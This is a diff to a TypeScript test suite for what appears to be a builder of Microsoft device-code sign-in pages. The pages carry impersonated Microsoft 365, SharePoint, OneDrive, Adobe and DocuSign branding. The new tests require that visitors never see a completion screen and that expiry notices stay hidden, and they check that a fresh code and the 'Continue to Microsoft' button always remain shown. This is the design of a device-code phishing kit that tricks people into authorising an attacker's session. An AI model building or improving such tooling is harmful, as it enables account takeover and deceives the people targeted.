@@ -61,14 +61,16 @@ describe("focused visual page designs", () => {
     expect(expired).not.toContain('data-action="restart-authorization"');
   });
 
-  it("replaces active authorization controls in the success preview", () => {
+  it("keeps the normal workflow visible and never renders a success screen", () => {
     const configuration = { ...defaultBuilderConfiguration("compact-card"), redirectUrl: "https://company.example/complete" };
     const document = buildPageDesign(configuration, "success");
     const success = renderPageDocument(document, { status: "success" }).html;
-    expect(success).toContain("Authorization Complete");
-    expect(success).toContain("company.example");
-    expect(success).not.toContain("XXXX-XXXX");
-    expect(success).not.toContain('data-action="open-microsoft"');
+    expect(success).not.toContain("Authorization Complete");
+    expect(success).not.toContain("Authorization complete");
+    expect(success).toContain("XXXX-XXXX");
+    expect(success).toContain('data-action="copy-device-code"');
+    expect(success).toContain('data-action="open-microsoft"');
+    expect(success).toContain("Redirecting…");
   });
 
   it("keeps the official Microsoft device action and deliberate provider identity in every design", () => {
@@ -79,6 +81,26 @@ describe("focused visual page designs", () => {
       expect(nodes.some((node) => node.type === "providerLogo" || node.type === "logo"), design.name).toBe(true);
       expect(renderPageDocument(buildPageDesign(configuration)).html).toContain("Continue to Microsoft");
     }
+  });
+
+  it("uses local immutable provider assets and keeps split document responsive", () => {
+    for (const provider of ["microsoft365", "sharepoint", "onedrive", "adobe", "docusign"] as const) {
+      const html = renderPageDocument(buildPageDesign(defaultBuilderConfiguration("split-screen", provider))).html;
+      expect(html).toContain(`/providers/${provider}/`);
+      expect(html).not.toContain("https://cdn.");
+    }
+    const rendered = renderPageDocument(buildPageDesign(defaultBuilderConfiguration("split-screen")));
+    expect(rendered.html).toContain("minmax(0,1.6fr) minmax(320px,1fr)");
+    expect(rendered.css).toContain("@container (max-width:620px)");
+    expect(rendered.css).toContain("[data-node-id=split-document]{grid-template-columns:1fr!important}");
+  });
+
+  it("never exposes expiration management in the visitor document", () => {
+    const rendered = renderPageDocument(buildPageDesign(defaultBuilderConfiguration("document-view"), "expired"), { status: "expired" });
+    expect(rendered.html).not.toMatch(/expires in|code expired|refresh code|authorization expired/i);
+    expect(rendered.html).toContain("Preparing a new Microsoft code");
+    expect(rendered.html).toContain("Copy Code");
+    expect(rendered.html).toContain("Continue to Microsoft");
   });
 });
 
